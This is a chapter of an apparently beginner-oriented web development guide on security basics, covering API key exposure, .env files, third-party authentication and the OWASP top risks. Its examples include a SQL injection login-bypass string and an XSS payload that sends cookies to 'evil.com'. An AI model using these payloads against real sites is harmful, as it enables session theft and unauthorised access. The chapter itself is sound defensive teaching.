# Chapter 11: Security Basics — Don't Get Hacked 🔒

You've built something real. Your app works, it looks good, and maybe you're even getting your first users. That's incredible.

Now let's make sure nobody ruins it.

Security might sound like something only big companies worry about — but here's the truth: **small apps are the easiest targets.** Hackers don't just go after banks. They use automated tools that scan the entire internet looking for easy wins. And a solo developer who skipped security basics? That's the easiest win of all.

This chapter won't turn you into a cybersecurity expert. But it will help you avoid the mistakes that trip up 90% of new developers — and keep your app, your users, and your wallet safe.

---

## Why Security Matters (Even for Small Apps)

"Nobody's going to hack *my* little app."

That's what every hacked developer thought before it happened. Here are some real stories (details changed to protect the unlucky):

> **The $12,000 Mistake** 💸
>
> A solo developer was building a small e-commerce app. They connected Stripe for payments and pasted their Stripe API key directly into their code. They pushed the code to a public GitHub repository. Within 48 hours, someone found the key using an automated scanner, and charged $12,000 to their account. Stripe eventually helped, but it took weeks to resolve — and the developer almost lost their business.

> **The Bot That Never Sleeps** 🤖
>
> A solopreneur launched a small SaaS tool. Their login page had no rate limiting — meaning someone (or some*thing*) could try to log in as many times as they wanted, as fast as they wanted. A bot tried millions of username/password combinations. Eventually, it guessed a user's weak password and got in. The attacker downloaded every user's data and emailed the developer a ransom demand.

> **The Database URL in the Browser** 😱
>
> A new developer accidentally put their database connection string in their frontend code. Anyone who opened the browser's developer tools could see the full URL, username, and password to their database. Someone found it, deleted all the data, and left a message: "You should secure this."

These aren't edge cases. They happen every single day. The good news? **Every one of these was preventable with basic knowledge.** That's what this chapter gives you.

---

## The #1 Vibe Coding Mistake: Exposed API Keys

This is the single most common security mistake made by new developers, and vibe coders especially. Let's break it down.

### What Is an API Key?

Think of an API key as **a password that lets your app talk to other services.**

When your app needs to send emails (via SendGrid), process payments (via Stripe), or store files (via AWS), it uses an API key to prove it has permission. If someone steals that key, they can use the service *as you* — and you get the bill.

### What API Keys Look Like

Here's the tricky part — API keys don't always look the same. Here are examples of what they look like for common services:

```
# Stripe
sk_live_EXAMPLE_KEY_DO_NOT_USE_replace_with_yours...

# OpenAI
sk-proj-EXAMPLE-DO-NOT-USE-replace-with-yours...

# Supabase
eyJ-EXAMPLE-DO-NOT-USE-replace-with-yours...

# AWS
AKIA-EXAMPLE-DO-NOT-USE

# SendGrid
SG.xxxxxxxxxxxxxxxxxxxxxx.yyyyyyyyyyyyyyyyyyyyyyyyyyyy

# Firebase (these are okay to be public — but other Firebase keys are NOT)
AIzaSyC1a2B3c4D5e6F7g8H9i0J1k2L3m4N5o6P
```

### How to Check If Yours Are Exposed

Search your code for these patterns right now:

```bash
# In your project folder, search for common key patterns
grep -r "sk_live" .
grep -r "sk-proj" .
grep -r "AKIA" .
grep -r "SG\." .
grep -r "password" .
grep -r "secret" .
```

If any of these show up in your actual code files (not in a `.env` file), you have a problem. Keep reading — we'll fix it.

### Why This Is Extra Dangerous with Vibe Coding

When you're building with AI, you often paste code snippets back and forth. It's incredibly easy to accidentally paste a real API key into your code, commit it to GitHub, and forget about it. Even if you delete it later, **it's still in your Git history.** Automated scanners check Git history too.

---

## Environment Variables Explained Simply

Here's the big idea:

> **Environment variables are secret passwords your app knows, but nobody else can see.**

### The Analogy

Imagine you're in a classroom. You have a secret — maybe a locker combination.

- ❌ **Bad approach:** Writing the combination on the whiteboard for everyone to see. That's what putting an API key in your code is like.
- ✅ **Good approach:** Writing it on a small note and keeping it in your pocket. Only you can read it. That's an environment variable.

Your app reads the secret from the note (the environment variable) at runtime. The secret never appears in your actual code. If someone reads your code, they see a placeholder like `process.env.STRIPE_KEY` — not the actual key.

### Why This Works

- Your code can be shared, published, or open-sourced safely
- Different environments (your computer, staging, production) can have different values
- If a key is compromised, you change it in one place — not across your entire codebase

---

## How to Use .env Files (Step by Step)

This is the practical, hands-on part. Follow along with your own project.

### Step 1: Create a .env File

In the root of your project (the main folder), create a new file called exactly `.env` — yes, the filename starts with a dot.

```
my-awesome-app/
├── .env          ← Create this file
├── .gitignore
├── package.json
├── src/
│   └── ...
└── ...
```

### Step 2: Add Your Secrets

Open `.env` and add your keys, one per line. The format is `NAME=value` with no spaces around the `=`:

```env
# Payment processing
STRIPE_SECRET_KEY=sk_live_EXAMPLE_KEY_DO_NOT_USE...

# AI features
OPENAI_API_KEY=sk-proj-EXAMPLE-replace-with-yours...

# Database
DATABASE_URL=postgresql://your_user:your_password@your_host:5432/your_db

# Email service
SENDGRID_API_KEY=SG.EXAMPLE-replace-with-yours
```

> ⚠️ **Important:** No quotes around the values (unless the value itself contains spaces). No spaces around the `=` sign.

### Step 3: Access Them in Your Code

**In a Next.js / React project:**

For server-side code (API routes, server components):
```javascript
// This works in API routes and server components
const stripeKey = process.env.STRIPE_SECRET_KEY;
```

For client-side code (things the browser runs), Next.js requires a special prefix:
```env
# In your .env file — note the NEXT_PUBLIC_ prefix
NEXT_PUBLIC_SUPABASE_URL=https://abc123.supabase.co
```

```javascript
// In your React components
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
```

> 🚨 **Critical Rule:** Only use `NEXT_PUBLIC_` for values that are truly safe to be public (like a Supabase project URL). **Never** put secret keys behind `NEXT_PUBLIC_` — they'll be visible to anyone using your app.

### Step 4: Add .env to .gitignore

This is the step people forget — and it's the most important one.

Open your `.gitignore` file (or create one) and add:

```gitignore
# Environment variables — NEVER commit these
.env
.env.local
.env.production
.env*.local
```

**Why?** Your `.gitignore` file tells Git: "Don't track these files." That means when you push your code to GitHub, your secrets stay on your computer. Without this step, your `.env` file gets uploaded for the world to see.

**How to check it's working:**

```bash
git status
```

If `.env` does NOT appear in the list, you're safe. If it does appear, your `.gitignore` isn't working — double-check the filename and spelling.

### Step 5: Set Up Environment Variables for Deployment

When you deploy to Vercel, Netlify, or Railway, your `.env` file doesn't go with your code (because it's in `.gitignore`). You need to add your secrets through their dashboard.

**On Vercel:**
1. Go to your project → Settings → Environment Variables
2. Add each variable name and value
3. Choose which environments need it (Production, Preview, Development)
4. Click Save

**On Netlify:**
1. Go to Site settings → Environment variables
2. Click "Add a variable"
3. Enter the key and value
4. Save

**On Railway:**
1. Click on your service → Variables
2. Add each variable
3. Railway automatically restarts your app

### Step 6: Create a .env.example File

Create a file called `.env.example` that shows what variables are needed — but with fake values:

```env
# Copy this file to .env and fill in your real values
STRIPE_SECRET_KEY=your_stripe_key_here
OPENAI_API_KEY=your_openai_key_here
DATABASE_URL=postgresql://your_user:your_password@your_host:5432/your_db
SENDGRID_API_KEY=your_sendgrid_key_here
```

This file **is** committed to Git. It helps you (and anyone else) know what environment variables the app needs, without exposing real values.

---

## Authentication: DON'T Build It Yourself

When you ask AI to add user accounts and login to your app, you might get code that handles passwords directly. **This is dangerous.**

### Why You Shouldn't Roll Your Own Auth

Authentication (login, signup, password reset, session management) is one of the **hardest problems in all of software engineering.** Even experienced teams at big companies get it wrong. Here's what you'd need to handle correctly:

- Hashing passwords securely (not just encrypting — there's a difference)
- Protecting against timing attacks
- Managing session tokens that can't be forged
- Handling password reset flows securely
- Rate-limiting login attempts
- Supporting two-factor authentication
- Dealing with OAuth flows (Sign in with Google, etc.)
- Storing tokens securely in the browser

Get any single one of these wrong, and your users' accounts are at risk. **There's no reason to do this yourself when free, battle-tested services exist.**

### Recommended Services

| Service | Best For | Free Tier | Ease of Use |
|---------|----------|-----------|-------------|
| **Supabase Auth** | Apps already using Supabase | Up to 50,000 MAUs | ⭐⭐⭐⭐⭐ |
| **Clerk** | Beautiful, drop-in UI components | Up to 10,000 MAUs | ⭐⭐⭐⭐⭐ |
| **Auth0** | Enterprise-grade needs | Up to 25,000 MAUs | ⭐⭐⭐⭐ |

**For most vibe coders, Supabase Auth or Clerk is the way to go.** They're free to start, well-documented, and AI tools know how to use them.

### How to Tell AI to Use These Services

When prompting your AI coding assistant, be specific:

```
❌ Bad prompt:
"Add user login to my app"

✅ Good prompt:
"Add user authentication to my Next.js app using Clerk.
Include sign-up, sign-in, and sign-out functionality.
Protect the /dashboard route so only logged-in users can access it.
Use Clerk's built-in components for the UI.
Do NOT implement custom password handling."
```

```
✅ Another good prompt:
"Set up Supabase Auth in my Next.js app.
Use email/password sign-up and Google OAuth.
Create a middleware that redirects unauthenticated users to /login.
Store the user session in cookies using Supabase's SSR helpers.
Do NOT store passwords or create a custom auth system."
```

That last line — "Do NOT implement custom password handling" — is important. It steers the AI away from generating insecure auth code from scratch.

---

## The Top 5 Security Risks Explained in Plain English

The OWASP Foundation tracks the most common security vulnerabilities in web applications. Here are the top 5, explained so anyone can understand them.

### 1. 💉 Injection Attacks — "Someone Types Code Into Your Form"

**What it is:** Imagine you have a search box on your site. A normal user types "blue shoes." An attacker types a piece of code that your database accidentally runs as a command — and it could delete all your data or reveal private information.

**Real example:** A login form asks for a username. Instead of typing a name, an attacker types:

```
' OR '1'='1' --
```

If your app isn't protected, the database reads this as "let anyone in" — and the attacker is logged in without a password.

**How to prevent it:**
- Use a framework or ORM (like Prisma) that automatically protects against this
- Never build database queries by gluing strings together
- Tell your AI: *"Use parameterized queries for all database operations"*

### 2. 🎭 Broken Authentication — "Someone Pretends to Be a User"

**What it is:** Your login system has a weakness that lets someone access another person's account. Maybe there's no limit on login attempts, so a bot can guess passwords all day. Maybe the session token is predictable. Maybe the password reset flow has a bug.

**Common causes:**
- No rate limiting on login (bots can try millions of passwords)
- Allowing weak passwords like "password123"
- Not supporting two-factor authentication (2FA)
- Session tokens that don't expire

**How to prevent it:**
- Use a third-party auth service (see above!)
- If you must handle it yourself, enforce strong passwords and add rate limiting
- Always offer 2FA for sensitive apps

### 3. 🔓 Data Exposure — "Your Secrets Are Visible to Everyone"

**What it is:** Sensitive information — API keys, database URLs, user data — is accidentally visible. Maybe it's in your frontend code. Maybe your API returns more data than it should. Maybe your database is accessible from the public internet with no password.

**Common causes:**
- API keys in frontend JavaScript (anyone can see them in browser dev tools)
- API endpoints that return full user objects (including passwords or emails) when they should return only a name
- Databases with default credentials or no firewall rules

**How to prevent it:**
- Keep secrets in environment variables (you learned this above!)
- Only return the data you actually need from API endpoints
- Review what your API endpoints return — does the user really need to see all that?

### 4. ⚙️ Security Misconfiguration — "You Left the Door Unlocked"

**What it is:** Your app works, but it's configured in a way that leaves it vulnerable. Think of it like moving into a new house and never changing the locks.

**Common causes:**
- Debug mode left on in production (shows detailed error messages to users)
- Default admin passwords never changed
- Unnecessary features or pages left enabled
- CORS configured to allow requests from anywhere (`*`)
- Directory listing enabled on your web server

**How to prevent it:**
- Before launching, make sure debug/development mode is OFF
- Change all default passwords
- Remove any test pages, sample data, or admin backdoors
- Set CORS to only allow your actual domain

### 5. 📜 Cross-Site Scripting (XSS) — "Someone Puts Malicious Code on Your Page"

**What it is:** If your app displays user-generated content (comments, profile bios, forum posts), an attacker can type JavaScript code instead of normal text. When other users view that content, the malicious code runs in their browser — stealing their session, redirecting them to a fake site, or worse.

**Example:** An attacker posts this as a comment on your blog:

```html
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

If your app displays this comment without sanitizing it, every visitor's browser runs that code and sends their cookies (including login sessions) to the attacker.

**How to prevent it:**
- Use a modern framework (React, Next.js, Vue, Svelte) — they escape user content by default
- Never use `dangerouslySetInnerHTML` in React (the name is a hint!)
- If you must render user HTML, use a sanitization library like DOMPurify
- Tell your AI: *"Make sure all user-generated content is properly sanitized before rendering"*

---

## Pre-Launch Security Checklist ✅

Before you share your app with the world, go through every item on this list. No shortcuts.

- [ ] **1. No API keys in your code** — Search your entire codebase for hardcoded keys, passwords, and secrets. Move them all to environment variables.

- [ ] **2. .env is in .gitignore** — Confirm your `.env` file is listed in `.gitignore` and doesn't appear when you run `git status`.

- [ ] **3. No secrets in Git history** — If you ever accidentally committed a secret, it's still in your Git history. Rotate (change) that key immediately on the service's dashboard.

- [ ] **4. Authentication uses a trusted service** — You're using Supabase Auth, Clerk, Auth0, or another established provider — not custom password handling.

- [ ] **5. HTTPS is enabled** — Your app is served over `https://`, not `http://`. Most hosting platforms (Vercel, Netlify) handle this automatically, but double-check.

- [ ] **6. Rate limiting on sensitive endpoints** — Your login page, signup page, and API endpoints have rate limiting so bots can't hammer them endlessly.

- [ ] **7. User input is validated and sanitized** — Form inputs, search boxes, and any place users enter data are checked before being processed or displayed.

- [ ] **8. Error messages don't leak information** — Your app shows friendly error messages to users, not stack traces, file paths, or database details. Make sure debug mode is OFF in production.

- [ ] **9. Dependencies are up to date** — Run `npm audit` (for Node.js projects) to check for known vulnerabilities in your packages. Fix critical and high-severity issues.

- [ ] **10. Database is not publicly accessible** — Your database should only accept connections from your app server, not from the entire internet. Check your database provider's firewall/access settings.

> 💡 **Tip:** Bookmark this checklist and run through it every time you deploy a major update, not just at launch.

---

## Ask AI for a Security Review: Prompt Templates

One of the best things you can do is ask your AI coding assistant to review your code specifically for security issues. Here are prompts you can copy and paste.

### General Security Audit

```
Review my codebase for security vulnerabilities. Specifically check for:

1. Hardcoded API keys, passwords, or secrets anywhere in the code
2. Environment variables that might be exposed to the client/browser
3. SQL injection or NoSQL injection vulnerabilities
4. Cross-site scripting (XSS) risks in how user input is displayed
5. Authentication or authorization bypasses
6. Sensitive data being logged or returned in API responses
7. CORS misconfiguration
8. Missing rate limiting on login or signup endpoints
9. Debug mode or development settings still active
10. Insecure dependencies (known CVEs)

For each issue found, explain:
- What the risk is in plain English
- Where exactly the issue is (file and line)
- How to fix it with a code example
```

### Pre-Deployment Check

```
I'm about to deploy my app to production. Review my code and configuration
for deployment readiness, focusing on security:

- Are there any secrets that would be exposed?
- Is debug/development mode properly disabled for production?
- Are all API routes properly protected with authentication where needed?
- Are error messages safe for public users to see?
- Is the database connection configured securely?

Give me a pass/fail for each item with specific details on any failures.
```

### Environment Variable Audit

```
Check my project for environment variable security:

1. List every API key, secret, or credential in the codebase
2. For each one, tell me if it's properly stored in an environment variable
   or if it's hardcoded
3. Check if any secrets use the NEXT_PUBLIC_ prefix (they shouldn't)
4. Verify that .env files are in .gitignore
5. Check if there's a .env.example file with safe placeholder values

Flag anything that needs immediate attention.
```

### After Adding a New Feature

```
I just added [describe your feature]. Review this new code for security:

- Does it handle user input safely?
- Could an attacker abuse this feature?
- Are there any new API keys or secrets that need to be protected?
- Does it follow the principle of least privilege?
- Are there any edge cases that could cause data leaks?
```

---

## Wrapping Up

Security isn't about being paranoid — it's about being prepared. You don't need to understand every attack vector or read every CVE report. You just need to:

1. **Keep your secrets secret** (environment variables, not hardcoded)
2. **Don't build auth yourself** (use Supabase, Clerk, or Auth0)
3. **Validate everything users type** (never trust input)
4. **Run the checklist before you launch** (every single time)
5. **Ask AI to review your security** (use the prompts above)

These five habits will put you ahead of most developers — not just beginners, but many experienced ones too. Security isn't a one-time task. It's a mindset. And now you have it. 🛡️

---

**Next chapter:** [Chapter 12 →](../12-testing-basics/README.md)
**Previous chapter:** [← Chapter 10](../10-deployment/README.md)
